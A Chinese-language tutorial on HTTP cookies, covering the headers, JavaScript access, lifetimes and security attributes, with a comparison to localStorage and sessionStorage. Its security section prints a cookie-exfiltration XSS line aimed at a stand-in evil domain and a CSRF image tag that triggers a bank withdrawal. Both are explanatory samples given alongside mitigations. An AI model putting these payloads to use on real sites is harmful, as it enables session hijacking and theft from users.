## 什么是 Cookie

了解 http 的同学，肯定知道，http 是一个不保存状态的协议，什么叫不保存状态，就是一个服务器是不清楚是不是同一个浏览器在访问他，这时候 cookie 就出现了，cookie 就是一种浏览器管理状态的一个文件。

通过 cookie 可以将一些信息存储在浏览器上，

- 当用户访问 web 页面时，他的名字可以记录在 cookie 中。
- 在用户下一次访问该页面时，可以在 cookie 中读取用户访问记录。

Cookie 以名/值对形式存储，如下所示:

```
username=John Doe
```

## 响应头和 Cookie

### Set-Cookie

当服务器收到 HTTP 请求时，服务器使用 `Set-Cookie` 响应头部向用户代理（一般是浏览器）发送 Cookie 信息。一个简单的 Cookie 可能像这样：

```
Set-Cookie: <cookie名>=<cookie值>
```

### Cookie

浏览器会将  `Set-Cookie` 中的 Cookie 信息保存下来，在之后的每一次新请求上，通过 `Cookie` 请求头部再发送给服务器。

```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

## JS 和 Cookie

通过 `document.cookie` 属性可创建新的 Cookie，也可通过该属性访问非 `HttpOnly` 标记的 Cookie。

```js
document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
// logs "yummy_cookie=choco; tasty_cookie=strawberry"
```

通过 JavaScript 创建的 Cookie 不能包含 `HttpOnly` 标志。

**测试的时候需要注意：** 在本地打开 HTML 文件，Chrome 的控制台无法用 JavaScript 读写操作 Cookies。

## 生命周期

Cookie 的生命周期可以通过两种方式定义：

- **会话期 Cookie** 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期 Cookie 不需要指定过期时间（Expires）或者有效期（Max-Age）。**需要注意的是，** 有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期 Cookie 也会被保留下来，就好像浏览器从来没有关闭一样，这会导致 Cookie 的生命周期无限期延长。
- **持久性 Cookie** 的生命周期取决于过期时间（`Expires`）或有效期（`Max-Age`）指定的一段时间。

## 安全

> 信息被存在 Cookie 中时，需要明白 cookie 的值时可以被访问，且可以被终端用户所修改的。
> 当机器处于不安全环境时，切记不能通过 HTTP Cookie 存储、传输敏感信息。

**缓解涉及 Cookie 的攻击的方法：**

- 使用 `HttpOnly` 属性可防止通过 JavaScript 访问 `cookie` 值。
- 用于敏感信息（例如指示身份验证）的 Cookie 的生存期应较短，并且 SameSite 属性设置为 Strict 或 Lax。（请参见上方的 SameSite Cookie。）在支持 SameSite 的浏览器中，这样做的作用是确保不与跨域请求一起发送身份验证 cookie，因此，这种请求实际上不会向应用服务器进行身份验证。

### 会话劫持和 XSS

在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。

```js
new Image().src =
  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

HttpOnly 类型的 Cookie 用于阻止了 JavaScript 对其的访问性而能在一定程度上缓解此类攻击。

### 跨站请求伪造（CSRF）

比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：

```js
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：

- 对用户输入进行过滤来阻止 XSS；
- 任何敏感操作都需要确认；
- 用于敏感信息的 Cookie 只能拥有较短的生命周期；

## Cookie vs localStorage vs sessionStorage

### 生命周期：

- cookie：可设置失效时间，没有设置的话，默认是关闭浏览器后失效
- localStorage：除非被手动清除，否则将会永久保存。
- sessionStorage： 仅在当前网页会话下有效，关闭页面或浏览器后就会被清除。

### 存放数据大小：

- cookie：4KB 左右
- localStorage 和 sessionStorage：可以保存 5MB 的信息。

### http 请求：

- cookie：每次都会携带在 HTTP 头中，如果使用 cookie 保存过多数据会带来性能问题
- localStorage 和 sessionStorage：仅在客户端（即浏览器）中保存，不参与和服务器的通信

### 易用性：

- cookie：需要程序员自己封装，源生的 Cookie 接口不友好
- localStorage 和 sessionStorage：源生接口可以接受，亦可再次封装来对 Object 和 Array 有更好的支持

## 应用场景：

从安全性来说，因为每次 http 请求都会携带 cookie 信息，这样无形中浪费了带宽，所以 cookie 应该尽可能少的使用，另外 cookie 还需要指定作用域，不可以跨域调用，限制比较多。但是用来识别用户登录来说，cookie 还是比 stprage 更好用的。其他情况下，可以使用 localStorage/sessionStorage，就用 localStorage/sessionStorage。
localStorage/sessionStorage 在存储数据的大小上面秒杀了 cookie，现在基本上很少使用 cookie 了，因为更大总是更好的，哈哈哈你们懂得。
localStorage 和 sessionStorage 唯一的差别一个是永久保存在浏览器里面，一个是关闭网页就清除了信息。localStorage 可以用来夸页面传递参数，sessionStorage 用来保存一些临时的数据，防止用户刷新页面之后丢失了一些参数。
